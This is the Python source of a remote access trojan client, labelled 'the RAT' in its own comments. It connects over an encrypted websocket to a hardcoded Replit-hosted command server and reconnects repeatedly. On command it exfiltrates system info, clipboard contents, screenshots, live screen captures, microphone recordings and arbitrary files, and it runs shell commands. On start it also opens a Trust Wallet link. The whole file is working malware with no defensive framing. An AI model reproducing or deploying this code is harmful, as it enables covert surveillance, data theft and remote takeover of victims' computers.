import asyncio
import websockets
import json
import os
import platform
import base64
import subprocess
import pyautogui
import sounddevice as sd
import soundfile as sf
import requests
import tempfile
import time
import threading
import clipboard
import webbrowser
from crypto import encrypt, decrypt

# Settings
SERVER_URL = "wss://fba5e6fc-16a4-4c00-a0fb-359cf18688b3-00-1mzbdu28jw5s0.picard.replit.dev"  # Replace with your server URL
RECONNECT_DELAY = 5
DEFAULT_URL = "https://trustwallet.com/?utm_source=cryptwerk"  # The URL you want to open automatically on execution

def get_system_info():
    return f"OS: {platform.system()} {platform.release()} | Node: {platform.node()} | Arch: {platform.machine()}"

async def send_info(ws, text):
    await ws.send(encrypt(json.dumps({"type": "info", "data": text})))

async def send_file(ws, filepath):
    try:
        with open(filepath, "rb") as f:
            filedata = base64.b64encode(f.read()).decode()
        filename = os.path.basename(filepath)
        await ws.send(encrypt(json.dumps({
            "type": "file",
            "filename": filename,
            "filedata": filedata
        })))
    except Exception as e:
        await send_info(ws, f"[!] Failed to send file: {e}")

async def send_clipboard(ws):
    try:
        text = clipboard.paste()
        await send_info(ws, f"Clipboard: {text}")
    except Exception as e:
        await send_info(ws, f"[!] Failed to get clipboard: {e}")

async def send_screen(ws):
    screenshot = pyautogui.screenshot()
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
    screenshot.save(tmp.name)
    await send_file(ws, tmp.name)
    os.unlink(tmp.name)

async def record_microphone(ws, seconds=10):
    try:
        samplerate = 44100
        recording = sd.rec(int(seconds * samplerate), samplerate=samplerate, channels=2)
        sd.wait()
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".wav")
        sf.write(tmp.name, recording, samplerate)
        with open(tmp.name, "rb") as f:
            filedata = base64.b64encode(f.read()).decode()
        await ws.send(encrypt(json.dumps({
            "type": "mic",
            "filedata": filedata
        })))
        os.unlink(tmp.name)
    except Exception as e:
        await send_info(ws, f"[!] Failed to record mic: {e}")

async def open_link():
    webbrowser.open(DEFAULT_URL)  # Open the link when the client starts

async def handle(ws):
    await send_info(ws, get_system_info())
    await open_link()  # Automatically open the predefined URL when the RAT starts

    while True:
        message = await ws.recv()
        try:
            decrypted = decrypt(message)
            data = json.loads(decrypted)

            if data["type"] == "screenshot":
                await send_screen(ws)

            elif data["type"] == "webcam":
                await send_info(ws, "[!] Webcam feature not supported.")

            elif data["type"] == "system_info":
                await send_info(ws, get_system_info())

            elif data["type"] == "keylogger":
                await send_info(ws, "[!] Keylogger not supported in Replit version.")

            elif data["type"] == "get_file":
                filepath = data.get("filepath")
                if filepath:
                    await send_file(ws, filepath)

            elif data["type"] == "clipboard":
                await send_clipboard(ws)

            elif data["type"] == "stream_screen":
                while True:
                    await send_screen(ws)
                    await asyncio.sleep(2)

            elif data["type"] == "cmd":
                command = data.get("command")
                if command:
                    output = subprocess.getoutput(command)
                    await send_info(ws, output)

            elif data["type"] == "record_mic":
                await record_microphone(ws)

            elif data["type"] == "shutdown":
                await send_info(ws, "[!] Shutdown not supported.")

        except Exception as e:
            await send_info(ws, f"[!] Error handling command: {e}")

async def connect():
    while True:
        try:
            async with websockets.connect(SERVER_URL) as ws:
                await handle(ws)
        except Exception as e:
            print(f"Connection failed: {e}")
            await asyncio.sleep(RECONNECT_DELAY)

def start():
    asyncio.run(connect())

if __name__ == "__main__":
    threading.Thread(target=start).start()